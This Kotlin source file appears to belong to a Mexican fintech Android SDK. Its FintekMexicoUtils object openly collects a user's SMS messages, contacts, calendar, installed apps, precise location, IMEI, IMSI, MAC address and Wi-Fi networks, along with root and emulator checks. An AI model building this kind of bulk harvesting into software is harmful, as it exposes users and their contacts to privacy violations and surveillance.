package com.fintek.utils_mexico

import android.Manifest
import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.Build
import android.os.SystemClock
import android.text.format.Formatter
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.packageInfo.PackageUtils
import com.fintek.utils_androidx.app.AppUtils
import com.fintek.utils_androidx.battery.BatteryUtils
import com.fintek.utils_androidx.calendar.CalendarEventUtils
import com.fintek.utils_androidx.contact.ContactUtils
import com.fintek.utils_androidx.date.DateUtils
import com.fintek.utils_androidx.device.DeviceUtils
import com.fintek.utils_androidx.hardware.HardwareUtils
import com.fintek.utils_androidx.language.LanguageUtils
import com.fintek.utils_androidx.location.LocationUtils
import com.fintek.utils_androidx.mac.MacUtils
import com.fintek.utils_androidx.network.NetworkUtils
import com.fintek.utils_androidx.phone.PhoneUtils
import com.fintek.utils_androidx.sms.SmsUtils
import com.fintek.utils_androidx.storage.RuntimeMemoryUtils
import com.fintek.utils_androidx.storage.SDCardUtils
import com.fintek.utils_androidx.storage.StorageUtils
import com.fintek.utils_androidx.thread.ThreadUtils
import com.fintek.utils_mexico.albs.AlbsUtils
import com.fintek.utils_mexico.battery.BatteryMexicoUtils
import com.fintek.utils_mexico.boardcastReceiver.NetworkBroadcastReceiver
import com.fintek.utils_mexico.date.DateMexicoUtils
import com.fintek.utils_mexico.device.DeviceMexicoUtils
import com.fintek.utils_mexico.device.SensorMexicoUtils
import com.fintek.utils_mexico.ext.catchOrEmpty
import com.fintek.utils_mexico.ext.catchOrLong
import com.fintek.utils_mexico.ext.catchOrZero
import com.fintek.utils_mexico.ext.safely
import com.fintek.utils_mexico.language.LanguageMexicoUtils
import com.fintek.utils_mexico.location.LocationMexicoUtils
import com.fintek.utils_mexico.model.*
import com.fintek.utils_mexico.network.NetworkMexicoUtils
import com.fintek.utils_mexico.query.*
import com.fintek.utils_mexico.structHandler.SmsMexicoStructHandler
import com.fintek.utils_mexico.storage.SDCardMexicoUtils
import com.fintek.utils_mexico.storage.StorageMexicoUtils
import com.fintek.utils_mexico.structHandler.AppMexicoStructHandler
import com.fintek.utils_mexico.structHandler.CalendarMexicoStructHandler

/**
 * Created by ChaoShen on 2021/4/12
 * Init Fintek mexico utils
 */
object FintekMexicoUtils {
    private var application: Application? = null
    private var gaid: String = ""
    private var ipAddress: String =  NetworkUtils.NETWORK_IP_DISABLE
    private val locationUtils by lazy { LocationUtils() }

    internal val requiredApplication: Application get() = requireNotNull(application) {
        "FintekMexicoUtils must init first, please use FintekMexicoUtils.init(Application application)"
    }

    @JvmStatic
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.ACCESS_WIFI_STATE])
    fun init(application: Application) = apply {
        this.application = application
        FintekUtils.init(application)
        val sp = requiredApplication.getSharedPreferences("fintek_mexico", Context.MODE_PRIVATE)
        val spGaid = sp.getString("gaid", "").orEmpty()
        if (spGaid.isNotEmpty()) {
            gaid = spGaid
        }

        safely {
            application.registerReceiver(NetworkBroadcastReceiver(), IntentFilter().apply {
                addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
            })
        }
        safely {
            NetworkMexicoUtils.wifiManager.startScan()
        }

        safely {
            NetworkUtils.getIpAsync(object : FintekUtils.Consumer<String> {
                override fun accept(t: String) {
                    ipAddress = t
                }
            })
        }

        DeviceUtils.getGaid(object : FintekUtils.Consumer<String> {
            override fun accept(t: String) {
                gaid = t
                if (t != spGaid) {
                    sp.edit().putString("gaid", t).apply()
                }
            }
        })
    }

    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    ])
    fun registerLocationListener() {
        safely { locationUtils.registerLocationListener() }
    }

    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    ])
    fun unregisterLocationListener() {
        safely { locationUtils.unregisterLocationListener() }
    }

    fun fetchLocationData() = locationUtils.getLocationData()

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.READ_SMS
    ])
    fun getExtension() = ExtensionModel(
        device = getDeviceInfo(),
        contacts = getContacts(),
        apps = getApps(),
        sms = getSms(),
        calendars = getCalendar(),
    )

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE
    ])
    fun getDeviceInfo(): DeviceInfo {
        val data = locationUtils.getLocationData()
        return DeviceInfo(
            albs = "",
            audioExternal = AudioQueryUtils.getExternalAudioCount(),
            audioInternal = AudioQueryUtils.getInternalAudioCount(),
            batteryStatus = getBatteryStatus(),
            generalData = getGeneralData(),
            hardware = getHardware(),
            network = getNetwork(),
            otherData = getOtherData(),
            newStorage = getStorage(),
            buildId = AppUtils.getAppVersionCode().toString(),
            buildName = AppUtils.getAppVersionName(),
            contactGroup = ContactQueryUtils.getContactGroupCount(),
            createTime = DateMexicoUtils.getCurrentDateTime(),
            downloadFiles = DownloadQueryUtils.getDownloadFileCount(),
            imagesExternal = ImageQueryUtils.getExternalImageCount(),
            imagesInternal = ImageQueryUtils.getInternalImageCount(),
            packageName = requiredApplication.packageName,
            videoExternal = VideoQueryUtils.getExternalVideoCount(),
            videoInternal = VideoQueryUtils.getInternalVideoCount(),
            gpsAdid = gaid,
            deviceId = DeviceMexicoUtils.getDeviceIdentify(),
            deviceInfo = HardwareUtils.getDevice(),
            osType = "android",
            osVersion = Build.VERSION.SDK_INT.toString(),
            ip = NetworkMexicoUtils.getIpAddressByWifi(),
            memory = catchOrEmpty("-1") { Formatter.formatFileSize(requiredApplication, RuntimeMemoryUtils.getTotalMemory()) },
            storage = catchOrEmpty("-1") { StorageMexicoUtils.getTotalStorageSize() },
            unUseStorage = catchOrEmpty("-1") { StorageMexicoUtils.getUnuseStorageSize() },
            gpsLatitude = data?.location?.latitude?.toString().orEmpty(),
            gpsLongitude = data?.location?.longitude?.toString().orEmpty(),
            gpsAddress = LocationMexicoUtils.getAddress(data?.location).orEmpty(),
            addressInfo = LocationMexicoUtils.getAddressDetail(data?.location).orEmpty(),
            isWifi = NetworkMexicoUtils.isWifiEnable(),
            wifiName = NetworkMexicoUtils.getCurrentWifi().name,
            battery = BatteryUtils.getPercent(),
            isRoot = DeviceMexicoUtils.isRoot(),
            isSimulator = DeviceMexicoUtils.isSimulator(),
            lastLoginTime = getOtherData().lastBootTime,
            picCount = ImageQueryUtils.getExternalImageCount() + ImageQueryUtils.getInternalImageCount(),
            imsi = DeviceMexicoUtils.getImsi(),
            mac = MacUtils.getMacAddress(),
            sdCard = catchOrEmpty("-1") { SDCardMexicoUtils.getSDCardTotalSize() },
            unUseSdCard = catchOrEmpty("-1") { SDCardMexicoUtils.getSDCardAvailableSize() },
            idfa = "",
            idfv = "",
            ime = DeviceUtils.getImei().orEmpty(),
            resolution = "${HardwareUtils.getPhysicalWidth()}x${HardwareUtils.getPhysicalHeight()}",
            brand = HardwareUtils.getBrand(),
        )
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    @RequiresPermission(Manifest.permission.READ_CONTACTS)
    fun getContacts(): List<Contact>? {
        return try {
            val contacts = ContactUtils.getContacts()
            val transformList = mutableListOf<Contact>()
            contacts.asSequence().forEach {
                when(it.phone?.size) {
                    0 -> transformList.add(
                        Contact(
                            name = it.name.orEmpty(),
                            phoneNumber = "",
                            updateTime = it.upTime?.toLong() ?: 0L,
                            lastTimeContacted = it.lastTimeContacted.toLong(),
                            timesContacted = it.timesContacted
                        )
                    )
                    1 -> transformList.add(
                        Contact(
                            name = it.name.orEmpty(),
                            phoneNumber = it.phone?.get(0).orEmpty(),
                            updateTime = it.upTime?.toLong() ?: 0L,
                            lastTimeContacted = it.lastTimeContacted.toLong(),
                            timesContacted = it.timesContacted
                        )
                    )
                    else -> transformList.addAll(
                        it.phone?.map { internalPhone ->
                            Contact(
                                name = it.name.orEmpty(),
                                phoneNumber = internalPhone,
                                updateTime = it.upTime?.toLong() ?: 0L,
                                lastTimeContacted = it.lastTimeContacted.toLong(),
                                timesContacted = it.timesContacted
                            )
                        } ?: emptyList()
                    )
                }
            }
            transformList
        } catch (e: Exception) {
            null
        } catch (e: Throwable) {
            null
        }
    }

    @JvmStatic
    fun getApps(): List<App>? = try {
        PackageUtils.getAllPackage(AppMexicoStructHandler())
    } catch (e: Exception) {
        null
    } catch (e: Throwable) {
        null
    }

    @JvmStatic
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @RequiresPermission(anyOf = [Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS])
    fun getSms(): List<Sms>? = try {
        SmsUtils.getAllSms(projection = SmsMexicoStructHandler())
    } catch (e: Exception) {
        null
    } catch (e: Throwable) {
        null
    }

    @JvmStatic
    @RequiresPermission(Manifest.permission.READ_CALENDAR)
    fun getCalendar(): List<Calendar> = try {
        CalendarEventUtils.getCalendar(CalendarMexicoStructHandler())
    } catch (e: Exception) {
        emptyList()
    } catch (e: Throwable) {
        emptyList()
    }

    private fun getBatteryStatus() = BatteryStatus(
        batteryLevel = BatteryMexicoUtils.getBatteryRemainder(),
        batteryMax = BatteryMexicoUtils.getBatteryCapacity(),
        batteryPercent = BatteryMexicoUtils.getPercent(),
        isAcCharge = BatteryMexicoUtils.isAcCharging(),
        isCharging = BatteryMexicoUtils.isCharging(),
        isUsbCharge = BatteryMexicoUtils.isUsbCharging()
    )

    @SuppressLint("MissingPermission", "NewApi")
    private fun getGeneralData() = GeneralData(
        androidId = DeviceMexicoUtils.getAndroidId(),
        currentSystemTime = System.currentTimeMillis(),
        elapsedRealtime = SystemClock.elapsedRealtime(),
        gaid = gaid,
        imei = DeviceUtils.getImei().orEmpty(),
        isUsbDebug = DeviceMexicoUtils.isEnableAdb(),
        isUsingProxyPort = NetworkMexicoUtils.isWifiProxy(),
        isUsingVpn = NetworkMexicoUtils.isEnableVpn(),
        language = LanguageMexicoUtils.getLanguage(),
        localeDisplayLanguage = LanguageUtils.getDisplayLanguage(),
        localeISO3Country = LanguageUtils.getIso3Country(),
        localeISO3Language = LanguageUtils.getIso3Language(),
        mac = MacUtils.getMacAddress(),
        networkOperatorName = NetworkUtils.getNetworkOperatorName(),
        networkType = NetworkMexicoUtils.getNetworkType(),
        networkTypeNew = NetworkMexicoUtils.getNetworkType(),
        phoneNumber = PhoneUtils.getPhoneNumber(),
        phoneType = catchOrZero { PhoneUtils.getPhoneType() },
        sensor = SensorMexicoUtils.getSensors(),
        timeZoneId = PhoneUtils.getTimeZoneId().toIntOrNull() ?: 1,
        uptimeMillis = SystemClock.uptimeMillis(),
        uuid = catchOrEmpty { DeviceUtils.getUniquePseudoId() }
    )

    private fun getHardware() = Hardware(
        board = HardwareUtils.getBoard(),
        brand = HardwareUtils.getBrand(),
        cores = ThreadUtils.getCpuCount(),
        deviceHeight = HardwareUtils.getPhysicalHeight(),
        deviceName = catchOrEmpty { DeviceUtils.getDeviceName() },
        deviceWidth = HardwareUtils.getPhysicalWidth(),
        model = HardwareUtils.getModel(),
        physicalSize = HardwareUtils.getPhysicalInch().toString(),
        productionDate = Build.TIME,
        release = HardwareUtils.getRelease(),
        sdkVersion = HardwareUtils.getSDKVersion().toString(),
        serialNumber = HardwareUtils.getSerialNumber()
    )

    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CHANGE_WIFI_STATE
    ])
    private fun getNetwork() = Network(
        ip = ipAddress,
        configuredWifi = NetworkMexicoUtils.configuredWifi,
        currentWifi = NetworkMexicoUtils.getCurrentWifi(),
        wifiCount = NetworkMexicoUtils.configuredWifi.count()
    )

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private fun getOtherData() = OtherData(
        dbm = DeviceMexicoUtils.getMobileDbm().toString(),
        keyboard = DeviceMexicoUtils.getCurrentKeyboardType(),
        lastBootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime(),
        isRoot = DeviceMexicoUtils.isRoot(),
        isSimulator = DeviceMexicoUtils.isSimulator()
    )

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private fun getStorage() = Storage(
        appFreeMemory = catchOrEmpty { RuntimeMemoryUtils.getAppFreeMemory().toString() },
        appMaxMemory = catchOrEmpty { RuntimeMemoryUtils.getAppMaxMemory().toString() },
        appTotalMemory = catchOrEmpty { RuntimeMemoryUtils.getAppTotalMemory().toString() },
        containSd = SDCardMexicoUtils.isContainSDCard(),
        extraSd = SDCardMexicoUtils.isExtraSDCard(),
        internalStorageTotal = catchOrLong { StorageUtils.internalTotalStorageSize() },
        internalStorageUsable = catchOrLong { StorageUtils.internalAvailableStorageSize() },
        memoryCardSize = catchOrLong(-1) { SDCardMexicoUtils.getTotalSize() },
        memoryCardFreeSize = catchOrLong(-1) { SDCardMexicoUtils.getSDCardFreeSize() },
        memoryCardUsedSize = catchOrLong(-1) { SDCardMexicoUtils.getUsedSize() },
        memoryCardUsableSize = catchOrLong(-1) { SDCardMexicoUtils.getAvailableSize() },
        ramTotalSize = catchOrEmpty { RuntimeMemoryUtils.getTotalMemory().toString() },
        ramUsableSize = catchOrEmpty { RuntimeMemoryUtils.getAvailableMemory().toString() }
    )
}